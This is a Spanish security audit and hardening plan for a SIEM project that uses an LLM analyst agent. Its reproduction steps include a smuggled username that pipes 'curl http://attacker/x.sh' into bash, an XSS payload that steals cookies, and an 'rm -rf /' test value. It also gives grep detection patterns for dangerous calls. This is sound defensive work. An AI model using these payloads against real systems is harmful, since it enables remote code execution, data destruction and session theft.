# 10 · Plan de acción — auditoría, endurecimiento y camino a la v1.0

> **Qué es este documento.** El resultado de una revisión completa del código en
> `/home/test/Descargas/SIEM-IA-main/Elastic-SIEM-Project` (16-09-2026) y el plan
> ejecutable que se deriva de ella. No reemplaza a la
> [auditoría del Council](../.claude/claude-context/outputs/auditoria-y-mejoras-2026-06-11.md)
> — la continúa: aquella cerró los P0 de secretos/ingesta y construyó la GUI;
> esta audita el resultado y define cómo llegar a un MVP con login, pruebas y SAST.
>
> **Todos los hallazgos de la §1 fueron reproducidos ejecutando el código**, no
> inferidos por lectura. Cada uno trae su comando de reproducción.

---

## 0. Estado actual (resumen honesto)

**Lo que está bien y no hay que tocar:**

- La arquitectura de dos agentes (determinístico + LLM) es correcta y está bien
  documentada. La separación "los comandos salen del playbook, no del LLM" es la
  decisión de diseño más valiosa del proyecto.
- **La no-autonomía se sostiene estructuralmente** (ver §6): no existe ningún
  camino de código que ejecute una acción de contención.
- El fallback determinístico funciona sin red ni stack: el sistema es demostrable
  offline, que es lo que hace viable una defensa/demo.
- `docs/` ya es una base sólida (11 documentos, coherentes entre sí).

**Lo que falta, en una línea cada uno:**

| Área | Estado |
|------|--------|
| Pruebas automatizadas | **0** — no hay ni un test, ni pytest, ni CI |
| Análisis estático | **0** — no hay pylint, bandit, ruff ni configuración |
| Autenticación | **0** — el dashboard y su API están abiertos a cualquiera en `127.0.0.1` |
| Correctitud del clasificador | 4 bugs lógicos confirmados, uno de ellos degrada un ataque real a "sospechoso" |
| Inmutabilidad de la auditoría | Declarada, **no garantizada** (§2.4) |

---

## 1. Hallazgos de la auditoría

Severidad: **P0** = corregir antes de mostrar el sistema · **P1** = antes de la v1.0 · **P2** = deuda técnica.

### 1.1 Tabla de hallazgos

| ID | P | Archivo | Hallazgo |
|----|---|---------|----------|
| **S-01** | P0 | `classifier.py:58-147` | Inyección de comando **por copiar-pegar**: `username`/`source_ip` de logs no confiables se interpolan sin validar en `comando_sugerido` |
| **S-02** | P0 | `templates/index.html:302` | **XSS almacenado**: `esc()` no escapa `'`, y el valor se interpola dentro de `onclick="decide(event,'…')"` |
| **L-01** | P0 | `classifier.py:242-243` | `event_count` de incidentes derivados de logs **siempre vale 1** → un ataque real queda por debajo del umbral y se degrada a `suspicious_auth` |
| **L-02** | P0 | `classifier.py:195-230` | Los incidentes se indexan por **víctima** (logs, `host_ip`) y por **atacante** (alertas, `source_ip`) → un mismo ataque se parte en dos incidentes |
| **L-03** | P1 | `classifier.py:286-289` | El incidente confirmado por el SIEM muestra el placeholder `<IP_ATACANTE>` en su acción #1 aunque la IP esté en `source_ip` |
| **L-04** | P1 | `classifier.py:429-481` | La correlación de campañas mezcla IPs de víctima y de atacante → campañas falsas |
| **A-01** | P0 | `scripts/reset.sh:25` | `rm -f decisions.jsonl analysis_history.jsonl` **destruye el registro append-only** |
| **A-02** | P1 | `siem_lib.py:184` | `append_jsonl` sin `flock` ni `fsync`; Flask es multi-hilo → escrituras concurrentes pueden entrelazarse |
| **A-03** | P1 | `dashboard.py` / `classifier.py` | `siem_incidents.json` se reescribe entero en cada corrida; los `action_id` de `decisions.jsonl` pueden quedar huérfanos |
| **A-04** | P2 | — | El log de auditoría no está encadenado por hash: es append-only *por convención*, no verificable |
| **API-01** | P0 | `dashboard.py` | Ningún endpoint requiere autenticación; `/api/decision` acepta decisiones anónimas firmadas con `ANALYST_NAME` del entorno |
| **API-02** | P1 | `dashboard.py:72` | Sin límite de tamaño en `note`, sin validar tipos, sin `MAX_CONTENT_LENGTH`; `get_json(force=True)` devuelve un 400 HTML, no JSON |
| **API-03** | P1 | `dashboard.py:83-89` | `/api/decision` relee y reparsea `siem_incidents.json` completo en cada POST |
| **API-04** | P1 | `dashboard.py` | Acepta un `action_id` **inexistente**: se registra una decisión sobre una acción que nunca existió |
| **API-05** | P2 | `dashboard.py` | Sin versionado (`/api/v1/…`), sin `Cache-Control`, sin rate limiting, sin CORS explícito |
| **B-01** | P1 | `siem_lib.py:49-66` | `es_search` no captura `ReadTimeout` (no es subclase de `ConnectionError`) → traceback en vez de `ESUnavailable` |
| **B-02** | P1 | `siem_lib.py` | `ES_HOST` es `http://` con `HTTPBasicAuth` → credenciales en claro; `verify=` nunca se especifica |
| **B-03** | P2 | `classifier.py:204-207` | Comparación **lexicográfica** de timestamps ISO con formatos mezclados (`…Z` de ES vs `+00:00` de `now_iso()`) |
| **B-04** | P2 | `classifier.py:510` | `siem_data.get("network_events")` / `web_events` **nunca existen**: `prepare-for-ia.py` no los genera → rama muerta |
| **B-05** | P2 | `classifier.py` + `network_logs/` | Los logs de simulación no se purgan nunca → cada corrida infla `event_count` del mismo incidente |
| **R-01** | P1 | `siem_lib.py:49-66,129-139` | `es_search` y `es_aggregate` duplican el bloque request/raise/except |
| **R-02** | P1 | `classifier.py:295-306,345-361,407-423` | Las tres `detect_*` construyen el mismo dict de 18 claves a mano |
| **R-03** | P1 | `dashboard.py:45-57,83-89` | Dos lecturas distintas del mismo `siem_incidents.json` con lógicas separadas |
| **R-04** | P2 | `siem_agent.py:187-213` | Cadena `if/elif` por tipo de ataque que replica la estructura de `_playbook()` |
| **R-05** | P2 | `templates/index.html` | 680 líneas de HTML+CSS+JS en un solo archivo, sin módulos ni tests posibles |

### 1.2 Los cuatro hallazgos que hay que entender en detalle

#### S-01 — Inyección de comando por copiar-pegar (P0)

El sistema nunca ejecuta el comando (eso se mantiene, §6). Pero el playbook
interpola datos controlados por el atacante en un string que el dashboard le
presenta al analista como *"comando sugerido"* con una explicación amable de qué
hace. El analista lo copia y lo pega en su terminal. Ahí se ejecuta.

```bash
# Reproducción
cat > /tmp/nl/evil.json <<'EOF'
{"@timestamp":"2026-09-16T10:00:00.000Z","event_type":"http_request",
 "source_ip":"10.0.0.1","url":"/login",
 "username":"victima; curl http://attacker/x.sh | bash","credential_submission":true}
EOF
python3 -c "import classifier,siem_lib; \
  print(classifier.detect_phishing(siem_lib.read_network_logs('/tmp/nl'))[0]['recommended_actions'][1]['comando_sugerido'])"
```

```
CMD: sudo passwd victima; curl http://attacker/x.sh | bash
```

La mitigación documentada ("los comandos salen del playbook, no del LLM")
protege contra la **alucinación** del LLM, pero no contra la **interpolación** de
datos no confiables en la plantilla del playbook. Son dos amenazas distintas y
solo una está cubierta.

En la rama de auth el riesgo es menor por accidente (`_FROM_IP_RE` es un regex
estricto), pero `port_scan` y `credential_harvesting` toman `source_ip` y
`username` crudos del JSON.

#### S-02 — XSS almacenado en el panel del analista (P0)

```js
const esc = s => (s ?? "").toString().replace(/[&<>"]/g, …)   // falta '
…
onclick="decide(event,'${esc(inc.incident_id)}','${esc(a.action_id)}','approved')"
```

`incident_id` se arma como `INC-PHISH-{source_ip}-{hash}` con el `source_ip` del
log. Un `source_ip` con una comilla simple rompe el string JS:

```
incident_id: INC-PHISH-1');alert(document.cookie);//-c5d1fbab
HTML:  onclick="decide(event,'INC-PHISH-1');alert(document.cookie);//-…','…','approved')"
```

Ejecución de JS arbitrario en la sesión del analista, entregada por el propio
sistema de seguridad. Con el login de la §5 esto pasa de molesto a robo de sesión.

#### L-01 + L-02 — El clasificador parte y degrada un ataque real (P0)

```bash
python3 -c "
import json, classifier
incs = classifier.classify(json.load(open('siem_clean.json')),
                           classifier.read_network_logs('network_logs'))
[print(i['incident_id'], i['classification']['attack_type'],
       i['classification']['severity'], 'count=', i['event_count']) for i in incs]"
```

Salida real con los datos capturados del stack:

```
INC-SCAN-172.18.0.7-dae0e19d  port_scan        alta   count= 26
INC-AUTH-172.18.0.3-eb1c0f86  ssh_brute_force  alta   count= 3    ← atacante, sin IP en el playbook (L-03)
INC-AUTH-172.18.0.7-63810000  suspicious_auth  media  count= 1    ← víctima, 12 logs reales colapsados a 1 (L-01)
INC-PHISH-172.18.0.9-981cfe01 credential_harvesting alta count= 1
```

Las dos primeras filas `AUTH` son **el mismo ataque** (172.18.0.3 → 172.18.0.7),
partido en dos porque las alertas se agrupan por atacante y los logs por víctima.
Y los 12 `Failed password` reales aparecen como `count=1` por:

```python
if not inc["event_count"]:      # ← solo entra la primera vez
    inc["event_count"] += 1     #    después event_count ya es truthy
```

El contador se queda en 1 para siempre. Con el umbral en 20, **ningún incidente
construido solo desde logs puede alcanzar nunca el umbral de fuerza bruta.** El
sistema depende por completo de que Kibana haya disparado una alerta; sin ella,
un ataque de 10.000 intentos se reporta como "media / requiere revisión manual".

De yapa, la campaña `CAMP-4f076704` vincula los tres incidentes usando
`172.18.0.7` como "IP compartida" — que es la **víctima** del SSH y el
**atacante** del port scan (L-04).

#### A-01 — El reset destruye la auditoría (P0)

`decisions.jsonl` se describe en cinco documentos como "registro inmutable" y
"append-only", y es el único artefacto que prueba la supervisión humana.
`scripts/reset.sh --yes` lo borra junto con los datos de demo, en el mismo `rm`.
Un registro que un script del propio repo puede borrar sin confirmación
específica no es un registro de auditoría: es un archivo de trabajo.

---

## 2. Pilar 1 — Revisión y refactorización

### 2.1 Corrección de los errores lógicos

| Paso | Qué hacer | Acepta cuando |
|------|-----------|---------------|
| 1.1 | **Modelo de identidad explícito.** Un incidente se identifica por `(attack_type, attacker_ip)`, nunca por la víctima. Renombrar los campos: `source_ip` → `attacker_ip` + `victim_hosts[]`. Extraer la IP del atacante del `message` *antes* de decidir la clave del bucket. | `INC-AUTH-172.18.0.3` y `INC-AUTH-172.18.0.7` colapsan en **un** incidente con `attacker_ip=172.18.0.3` |
| 1.2 | **Arreglar el contador** (L-01): `inc["event_count"] += 1` por cada log, y llevar el conteo de alertas en un campo separado `alert_event_count` para no sumar peras con manzanas. | 12 logs → `event_count == 12`; un fixture con 25 logs y sin alerta clasifica `ssh_brute_force` |
| 1.3 | **Playbook sin placeholders** (L-03): resolver la IP en cascada `attacker_ips[0] → source_ip → None`, y si es `None` **omitir la acción** en vez de emitir `<IP_ATACANTE>`. Una acción que no se puede ejecutar no debería ofrecerse. | Ningún `comando_sugerido` contiene `<` |
| 1.4 | **Campañas solo por IP de atacante** (L-04): `_link_campaigns` usa exclusivamente `attacker_ip`. | El port scan de 172.18.0.7 deja de "compartir campaña" con su víctima |
| 1.5 | **Timestamps como `datetime`** (B-03): parsear una vez al ingresar (`datetime.fromisoformat`, normalizando `Z` → `+00:00`), comparar objetos, serializar al final. | Fixture con `…Z` y `…+00:00` mezclados ordena bien |
| 1.6 | **Decidir B-04**: o `prepare-for-ia.py` extrae `network_events`/`web_events` de ES, o se borra la rama muerta de `classifier.py:510`. Recomendación: **borrarla** y documentar que `network_logs/` es la única fuente. | No queda código que lea claves inexistentes |
| 1.7 | **Retención de `network_logs/`** (B-05): filtrar por ventana temporal al leer (las mismas 24 h del resto del pipeline) en vez de leer todo el directorio. | Una corrida vieja deja de inflar `event_count` |

### 2.2 Saneamiento de la entrada no confiable (S-01)

El principio a fijar: **ningún dato de log llega a un comando sin pasar por un
validador con lista blanca.**

- Nuevo módulo `siem_validators.py`:
  - `valid_ip(s) -> str | None` — `ipaddress.ip_address()`, no un regex.
  - `valid_username(s) -> str | None` — `^[a-z_][a-z0-9_-]{0,31}$` (POSIX).
  - Todo lo que no valida devuelve `None` → la acción se omite (paso 1.3).
- Para los comandos que sí quedan, construirlos con `shlex.quote()` aunque el
  valor ya esté validado (defensa en profundidad).
- El campo pasa a tener dos formas: `comando_sugerido` (string, para mostrar) y
  `comando_argv` (lista, para que un futuro ejecutor *externo* no tenga que
  parsear un string — y para que sea auditable qué se propuso exactamente).

### 2.3 DRY — los cuatro bloques repetidos

| ID | Refactor |
|----|----------|
| R-01 | Extraer `_es_request(index, query, timeout) -> dict` con el `try/except` una sola vez; `es_search` y `es_aggregate` se reducen a proyectar `hits` o `aggregations`. Añadir de paso `requests.exceptions.Timeout` (B-01) y `verify`/`https` (B-02). |
| R-02 | Una dataclass `Incident` con los 18 campos y `to_dict()`. Las tres `detect_*` construyen la dataclass; los campos específicos (`scanned_ports`, `phishing_urls`) van en un `extras: dict`. Elimina ~60 líneas duplicadas y hace imposible que una detección olvide un campo. |
| R-03 | `dashboard.py`: una sola función `_incidents_with_state()`; `api_decision` reusa el índice `{incident_id: incident}` cacheado por mtime (cierra API-03 y habilita API-04). |
| R-04 | `siem_agent._fallback_analysis`: tabla `dict[attack_type] -> plantillas` en vez del `if/elif`. Misma forma que `_classification()`, que ya lo hace bien. |
| R-05 | Partir `templates/index.html` en `static/app.js` + `static/app.css` + plantilla. Sin esto, la §4 no puede testear nada de la UI por unidad. |

### 2.4 Inmutabilidad real del registro append-only

Hoy la garantía es una convención. Para que sea una propiedad del sistema:

1. **A-01 (P0):** sacar `decisions.jsonl` y `analysis_history.jsonl` de
   `reset.sh`. Si hay que archivarlos, `mv` a `audit/archive/<ts>/`, nunca `rm`.
   Un flag separado `--wipe-audit` con confirmación explícita y en mayúsculas.
2. **A-02 (P1):** `append_jsonl` con `fcntl.flock(LOCK_EX)` + `f.flush()` +
   `os.fsync()`. Abrir con `O_APPEND`. Coste: ~8 líneas.
3. **A-04 (P1):** **encadenar por hash.** Cada registro lleva
   `prev_hash` = SHA-256 del registro anterior serializado. Un verificador
   `audit_verify.py` recorre el archivo y confirma la cadena. Una edición o un
   borrado intermedio se vuelve detectable, que es exactamente lo que un registro
   de auditoría tiene que ofrecer. (Usar `hashlib.sha256`, no `sha1`; ver §3.)
4. **A-03 (P1):** `siem_incidents.json` es **estado derivado**, no auditoría —
   documentarlo así. Al regenerarlo, conservar los `action_id` estables
   (derivarlos del contenido de la acción, no de su posición en la lista) para
   que las decisiones históricas sigan apuntando a algo real.
5. Permisos: `chmod 0600` en creación, y directorio `audit/` separado de los
   artefactos regenerables.

### 2.5 Calidad de la API REST (:5000)

| ID | Corrección |
|----|-----------|
| API-01 | Autenticación obligatoria en todos los endpoints (§5). El analista sale de la **sesión**, nunca de `os.getenv("ANALYST_NAME")`. |
| API-02 | Validación de esquema en la entrada: `note` ≤ 500 caracteres, tipos verificados, `app.config["MAX_CONTENT_LENGTH"] = 64 * 1024`. Un `@app.errorhandler` que devuelve **siempre JSON** (hoy un body malformado devuelve HTML de Werkzeug a un cliente que espera JSON). |
| API-04 | Rechazar con **404** un `action_id` que no existe en el incidente indicado. Hoy se acepta y se escribe en el log inmutable — contaminando permanentemente la auditoría con acciones fantasma. |
| API-05 | Prefijo `/api/v1/`; `Cache-Control: no-store` en respuestas con datos de incidentes; CORS explícitamente deshabilitado; rate limit simple (`flask-limiter`) en `/api/v1/decision`. |
| — | Endpoint nuevo `GET /api/v1/healthz` (sin auth) para que las pruebas de la §4 y el arranque sepan si el server está listo sin depender de `/`. |
| — | Devolver `409 Conflict` si se decide una acción ya decidida con el mismo valor; ayuda a distinguir un doble-click de una revisión real. |

**Contrato resultante (la referencia para las pruebas de la §4):**

```
GET  /api/v1/healthz                 → 200 {"status":"ok"}                 (público)
POST /api/v1/login                   → 200 + cookie de sesión | 401        (público)
POST /api/v1/logout                  → 204                                 (sesión)
GET  /api/v1/incidents               → 200 {incidents:[…], analyst_mode}   (sesión)
GET  /api/v1/incidents/<id>          → 200 | 404                           (sesión)
POST /api/v1/decision                → 201 {ok,record} | 400 | 401 | 403 | 404 | 409   (rol analyst+)
GET  /api/v1/decisions               → 200 [...]                           (sesión)
GET  /api/v1/audit/verify            → 200 {"chain_ok":true,"records":N}   (rol auditor)
```

---

## 3. Pilar 2 — Pruebas de código estático (SAST)

### 3.1 Cadena de herramientas

**Python** (`requirements-dev.txt`):

| Herramienta | Rol | Por qué esta |
|-------------|-----|--------------|
| `pylint` + **`pylint-secure-coding-standard`** | Reglas de seguridad como plugin de pylint | Pedida explícitamente. Cubre `os.system`, `subprocess` con `shell=True`, `eval`/`exec`, `pickle`, `tempfile` inseguro, `yaml.load`, permisos de archivo |
| `bandit` | SAST específico de seguridad | Complementa: detecta `hashlib.sha1` sin `usedforsecurity=False` (B324) — que **el proyecto tiene hoy** en `classifier.py:52` y `:476` — y `requests` sin `timeout` |
| `ruff` | Linter/formateador rápido | Corre en <1 s; se encarga del estilo para que pylint se dedique a la lógica |
| `mypy` | Tipos | El código ya está anotado (`from __future__ import annotations`): el retorno es inmediato |

**JavaScript** (tras el refactor R-05, `package.json`):

| Herramienta | Rol |
|-------------|-----|
| `eslint` + **`eslint-plugin-security`** | Pedida explícitamente: `detect-eval-with-expression`, `detect-non-literal-fs-filename`, `detect-object-injection` |
| `eslint-plugin-no-unsanitized` | **El que importa acá**: marca la asignación a `innerHTML` con contenido no literal — el vector exacto de S-02, que `eslint-plugin-security` por sí solo no detecta |

**Secretos:** `gitleaks` en pre-commit. El repo ya tuvo secretos versionados una
vez (S1/S2 de la auditoría anterior); esto evita la tercera.

### 3.2 Configuración

`.pylintrc`:

```ini
[MAIN]
load-plugins=pylint_secure_coding_standard
[SECURE_CODING_STANDARD]
os-system=True            # prohibido
subprocess-run-check=True
eval-used=True
exec-used=True
[MESSAGES CONTROL]
disable=C0114,C0115,C0116  # docstrings: el proyecto ya documenta a nivel módulo
```

`.eslintrc.json`:

```json
{
  "plugins": ["security", "no-unsanitized"],
  "extends": ["eslint:recommended", "plugin:security/recommended"],
  "rules": { "no-unsanitized/property": "error", "no-unsanitized/method": "error" }
}
```

### 3.3 Puerta de calidad

- **Bloqueante (falla el build):** cualquier hallazgo `HIGH`/`MEDIUM` de bandit;
  cualquier regla de `pylint-secure-coding-standard`; `no-unsanitized/*`.
- **Informativo:** score de pylint (objetivo ≥ 9.0), `mypy` en modo no estricto
  al principio.
- **Excepciones:** solo con `# nosec B###: <justificación>` y revisión. Prohibido
  el `# nosec` pelado.
- `pre-commit` corre ruff + gitleaks (rápido); la suite completa corre en CI.

### 3.4 Hallazgos que el SAST va a levantar el día 1 (ya verificados)

| Regla | Ubicación | Acción |
|-------|-----------|--------|
| bandit B324 (hash inseguro) | `classifier.py:52`, `:476` | `hashlib.sha1(…, usedforsecurity=False)` — es un ID, no un control de seguridad. Explicitarlo |
| bandit B113 (request sin timeout) | `siem_lib.py` | Ya tiene `timeout`; confirmar que no se pierde en el refactor R-01 |
| pylint-scs subprocess | `siem_pipeline.py:31` | **Justificado** (§6): agregar `check=False` explícito y `# nosec` con la justificación de no-autonomía |
| shell `eval` | `scripts/start.sh:30` | `eval "$cmd"` con strings literales: reemplazar por funciones bash, no vale el riesgo |
| no-unsanitized | `templates/index.html` (× ~15) | Es el refactor R-05 + S-02: el motor de render pasa a `textContent`/`createElement` o a plantillas escapadas |

---

## 4. Pilar 3 — Pruebas de servicio y UI

### 4.1 Objetivo medible

> **≥ 80 % de cobertura de las funciones críticas de clasificación, en < 5 minutos.**

Hay que definir "funciones críticas" o la métrica no significa nada. **Alcance
del 80 %: `classifier.py`, `siem_lib.py` y los endpoints de `dashboard.py`.**
Se mide con `pytest --cov=classifier --cov=siem_lib --cov=dashboard
--cov-fail-under=80`. El resto del repo (scripts de simulación, `get-logs.py`)
queda fuera del umbral a propósito.

Presupuesto de tiempo: **unitarias ≤ 30 s · integración ≤ 60 s · Playwright ≤ 150 s
· SAST ≤ 60 s** ⇒ total ≈ 5 min con margen.

### 4.2 Estructura

```
tests/
  conftest.py                 # fixtures: app Flask, tmp_path para jsonl, cliente autenticado
  fixtures/
    siem_clean.min.json       # captura real recortada (12 logs / 7 alertas)
    network_logs/             # port-scan, phishing, y los casos maliciosos
    malicious/                # S-01 y S-02 como fixtures permanentes
  unit/
    test_classifier_thresholds.py
    test_classifier_identity.py
    test_playbook_injection.py     # ← S-01 como test de regresión
    test_campaigns.py
    test_siem_lib_io.py
    test_audit_chain.py            # ← A-04
  integration/
    test_api_incidents.py
    test_api_decision.py
    test_api_auth.py               # ← API-01
    test_audit_append_only.py
  e2e/
    test_triage_flow.spec.py       # Playwright
```

### 4.3 Casos que no pueden faltar

**Unitarias — clasificación (el corazón del 80 %):**

| Test | Verifica |
|------|----------|
| `test_count_matches_log_lines` | 12 logs → `event_count == 12` (regresión de **L-01**) |
| `test_threshold_boundary` | 19 fallos → `suspicious_auth`; 20 → `ssh_brute_force`; 5000 → `critica` |
| `test_no_alert_still_detects` | 25 logs **sin alerta de Kibana** → `ssh_brute_force` (el agujero de L-01) |
| `test_single_incident_per_attacker` | Alertas + logs del mismo ataque → **1** incidente (regresión de **L-02**) |
| `test_port_scan_threshold` | 9 puertos → nada; 10 → `port_scan` |
| `test_playbook_never_emits_placeholder` | Ningún `comando_sugerido` contiene `<` (L-03) |
| `test_playbook_rejects_injection` | `username = "x; rm -rf /"` → acción omitida, **nunca** un comando con `;` (**S-01**) |
| `test_campaign_only_by_attacker_ip` | Víctima compartida ≠ campaña (L-04) |
| `test_timestamps_mixed_formats` | `…Z` y `+00:00` ordenan igual (B-03) |

**Integración — API** (cliente de prueba de Flask, sin red):

| Test | Espera |
|------|--------|
| `test_incidents_requires_auth` | 401 sin sesión (**API-01**) |
| `test_decision_invalid_value` | `decision:"execute"` → 400 **y body JSON** |
| `test_decision_unknown_action_id` | 404, y **`decisions.jsonl` no crece** (**API-04**) |
| `test_decision_note_too_long` | 400 con `note` de 10 KB (API-02) |
| `test_decision_appends_only` | El archivo solo crece; la línea N-1 es byte-idéntica antes y después |
| `test_state_is_replay_of_log` | Aprobar → descartar → aprobar ⇒ estado `approved`, **3** líneas en el log |
| `test_audit_chain_detects_tampering` | Editar una línea del medio ⇒ `/audit/verify` devuelve `chain_ok:false` (A-04) |
| `test_concurrent_decisions` | 20 POST en paralelo ⇒ 20 líneas bien formadas (**A-02**) |

**E2E — Playwright (Python, `pytest-playwright`):**

Un solo flujo, el que se demuestra en la defensa, sobre datos fijos:

1. Login con credenciales válidas → llega al triage.
2. La tabla de eventos muestra los 4 incidentes del fixture.
3. Filtrar por severidad `CRITICAL` → la tabla se reduce.
4. Click en un incidente → abre la pantalla de decisión con evidencia y factores.
5. **Aprobar** una acción → el badge pasa a `approved` sin recargar.
6. **Descartar** otra con nota → aparece en el historial de decisiones.
7. Recargar la página → los estados persisten (replay del log).
8. Logout → `/` redirige al login.
9. **Test de seguridad:** cargar el fixture con el `source_ip` malicioso de S-02
   y afirmar que **no se dispara ningún diálogo** y que el texto se ve literal.

Detalles operativos: `--browser chromium` solo (Firefox/WebKit no aportan acá),
`pytest-xdist -n auto`, servidor levantado por una fixture de sesión que espera
a `/api/v1/healthz`, `network_logs/` y los `.jsonl` en `tmp_path` para que los
tests nunca toquen los datos reales. Trazas y video solo `--on-first-retry`.

> **Precondición:** el paso 5 del E2E depende del refactor R-05. Testear el
> `index.html` de 680 líneas actual es posible pero frágil; hacerlo después del
> refactor cuesta la mitad y no hay que reescribirlo.

### 4.4 CI

```yaml
# .github/workflows/ci.yml  (o equivalente en GitLab)
jobs:
  sast:   ruff · pylint(+scs) · bandit · gitleaks · eslint(+security)   # ~60 s
  unit:   pytest tests/unit --cov --cov-fail-under=80                   # ~30 s
  integ:  pytest tests/integration                                      # ~60 s
  e2e:    pytest tests/e2e --browser chromium                           # ~150 s
```

`sast`, `unit` e `integ` en paralelo; `e2e` depende de que `unit` pase (no tiene
sentido abrir un browser si la clasificación está rota).

---

## 5. Pilar 4 — Versión 1.0 (MVP: demo + login)

### 5.1 Alcance del MVP (y lo que queda afuera)

**Adentro:** login con usuario/contraseña, sesión con cookie, 3 roles, vista de
triage, pantalla de decisión, auditoría con identidad real, logout y expiración.

**Afuera y documentado como tal:** MFA, recuperación de contraseña, alta de
usuarios por UI, SSO/LDAP, multi-tenancy. Para un MVP con supervisión humana en
un entorno de laboratorio, un archivo de usuarios versionado y bien protegido es
suficiente — y es honesto decirlo en la doc en vez de simularlo.

### 5.2 Autenticación y sesiones

| Decisión | Elección | Por qué |
|----------|----------|---------|
| Almacén de usuarios | `users.json` (fuera del repo, `chmod 600`), gestionado por un CLI `manage_users.py` | Sin base de datos: mantiene el "cero dependencias de infra" del proyecto. Migrar a SQLite después es trivial |
| Hash de contraseña | **Argon2id** (`argon2-cffi`), fallback `bcrypt` | `werkzeug.security` por defecto usa `scrypt`; Argon2id es el estándar actual y el SAST no lo cuestiona |
| Sesión | `Flask-Login` + cookie de sesión firmada | `SECRET_KEY` desde `.env`, **el server no arranca si falta** (nada de defaults) |
| Flags de cookie | `HttpOnly`, `SameSite=Lax`, `Secure` si hay TLS | `SameSite=Lax` ya mitiga el CSRF del POST |
| CSRF | `Flask-WTF` `CSRFProtect` con token en header `X-CSRFToken` | La API es JSON; el token va por header, no por form |
| Expiración | Inactividad 30 min, absoluta 8 h | Un turno de SOC |
| Anti-fuerza bruta | 5 intentos / 15 min por usuario+IP, con backoff | El proyecto **detecta** fuerza bruta: sería irónico ser vulnerable a ella |

`ANALYST_NAME` del entorno **desaparece**. El campo `analyst` de
`decisions.jsonl` pasa a salir de `current_user.username`, que es lo que hace que
la auditoría signifique algo. Se agrega `session_id` (no la cookie: un ID
derivado) y `user_agent` al registro.

### 5.3 Roles (base para el RBAC completo)

| Rol | Ve el triage | Decide acciones | Ve la auditoría | Verifica la cadena |
|-----|:---:|:---:|:---:|:---:|
| `viewer` | ✅ | ❌ | ✅ | ❌ |
| `analyst` | ✅ | ✅ | ✅ | ❌ |
| `auditor` | ✅ | ❌ | ✅ | ✅ |

Implementación: decorador `@require_role("analyst")`, con los permisos en una
tabla, no dispersos en `if`. Nombrar `admin` desde ahora aunque no se use, para
no reescribir el esquema de `users.json` después.

> **Nota de diseño deliberada:** **ningún rol puede ejecutar acciones.** El RBAC
> controla *quién decide*, no *quién ejecuta* — porque nadie ejecuta (§6). Esto
> tiene que estar escrito en la doc para que un lector no asuma que `admin` es el
> rol que "aprieta el botón rojo": ese botón no existe.

### 5.4 Vista de triage y pantalla de decisión

El `index.html` actual ya tiene casi todo: tabla de eventos, detalle, evidencia,
historial, campañas. El trabajo de la v1.0 es **separarlo y cerrarlo**, no
reescribirlo:

1. **Triage** (`/`) — lista priorizada. Agregar sobre lo existente: columna
   "antigüedad", indicador de acciones pendientes por incidente, y persistir los
   filtros en la URL (para poder compartir y para que Playwright navegue directo).
2. **Decisión** (`/incident/<id>`) — hoy es un panel lateral; pasa a ruta propia.
   Layout: *evidencia* (cronología, factores del clasificador) a la izquierda,
   *análisis* + acciones con Aprobar/Descartar a la derecha. Hacer el
   `false_positive_likelihood` imposible de pasar por alto: es el dato que decide
   si el analista aprueba o no.
3. **Reemplazar `prompt()`** por un modal con textarea y contador de caracteres
   (500). `prompt()` no se puede estilar, no se puede testear bien y bloquea.
4. **Estado vacío honesto:** "no hay incidentes" vs. "todavía no corriste el
   pipeline" son cosas distintas; el `missing: true` ya existe en el backend pero
   la UI no lo distingue.
5. **Accesibilidad mínima:** los `onclick` sobre `<tr>` y `<span>` no son
   navegables por teclado. El refactor R-05 los convierte en `<button>` con
   delegación de eventos — que además es la corrección estructural de **S-02**.

### 5.5 Secuencia de implementación

```
5.5.1  SECRET_KEY + users.json + manage_users.py + hash Argon2
5.5.2  /login, /logout, Flask-Login, protección de todos los endpoints  → cierra API-01
5.5.3  Roles + @require_role                                            → base del RBAC
5.5.4  analyst desde la sesión en decisions.jsonl                       → auditoría real
5.5.5  R-05: partir index.html → static/app.js + app.css                → habilita 5.5.6 y el E2E
5.5.6  Triage y decisión como rutas separadas + modal de nota
5.5.7  E2E de Playwright sobre el flujo completo
```

---

## 6. Pilar 5 — Certificación de no-autonomía

### 6.1 Resultado de la revisión

**Certificado: ningún componente del sistema puede ejecutar acciones de
contención sobre la infraestructura.** Verificado por inspección exhaustiva, no
por muestreo:

```bash
grep -rnE "subprocess|os\.system|os\.popen|eval\(|exec\(|shell=True|paramiko|pty\." --include=*.py .
# → siem_pipeline.py:18  import subprocess
# → siem_pipeline.py:31  result = subprocess.run(cmd)

grep -rn "comando_sugerido" --include=*.py --include=*.html .
# → classifier.py: 13 ocurrencias, todas ASIGNACIÓN en el playbook
# → siem_agent.py:266: interpolación en un print()
# → templates/index.html:542-543: interpolación en HTML para mostrar
```

**La única ejecución de procesos del sistema** es `siem_pipeline.py:31`, y es
segura por construcción:

- `cmd` sale de la constante `STEPS`, una lista **literal** de tres elementos.
- Son `[sys.executable, "<script>.py"]` — las tres etapas del propio pipeline.
- **Sin `shell=True`**: no hay interpretación de metacaracteres.
- Ningún dato de log, de alerta o del LLM llega a esa llamada por ningún camino.

**`comando_sugerido` nunca se ejecuta.** Sus 13 sitios de uso son: 11
asignaciones de plantilla en `classifier.py`, un `print()` en `siem_agent.py` y
una interpolación de texto en el HTML. No hay `subprocess`, `os.system`, SSH,
webhook ni cliente de API de firewall en el proyecto. El LLM tampoco tiene
herramientas: `siem_agent.py` hace una sola llamada `generate_content` con
`response_mime_type="application/json"` — sin function calling, sin tools.

**Y el dashboard no expone ninguna superficie de ejecución:** los tres endpoints
son `/api/incidents` (GET), `/api/decision` (POST, solo escribe una línea de
texto en un `.jsonl`) y `/api/decisions` (GET). Aprobar una acción **registra una
intención**; no dispara nada. Eso está bien y es el diseño correcto.

### 6.2 La advertencia que sí corresponde hacer

La propiedad se cumple **hoy**, pero se sostiene solo en la disciplina de quien
escriba el próximo commit. No hay un mecanismo que la haga cumplir. Y S-01
demuestra que el sistema ya puede entregar un comando armado por un atacante a un
humano que lo va a ejecutar a mano: **la no-autonomía técnica no protege del
todo si el comando que se muestra es hostil.** La cadena termina en un humano con
sudo, y ese humano es parte del sistema.

### 6.3 Cómo convertirla en una garantía verificable

| Control | Implementación |
|---------|----------------|
| **Test de arquitectura** | `tests/test_no_autonomy.py`: recorre el AST de todos los `.py` y falla si aparece `os.system`, `os.popen`, `subprocess.*` (salvo `siem_pipeline.py`, en allowlist explícita), `eval`, `exec`, `shell=True` o un import de `paramiko`/`fabric`. Corre en CI en cada commit |
| **Regla SAST** | `pylint-secure-coding-standard` con `os-system=True`, `eval-used=True` (§3.2) |
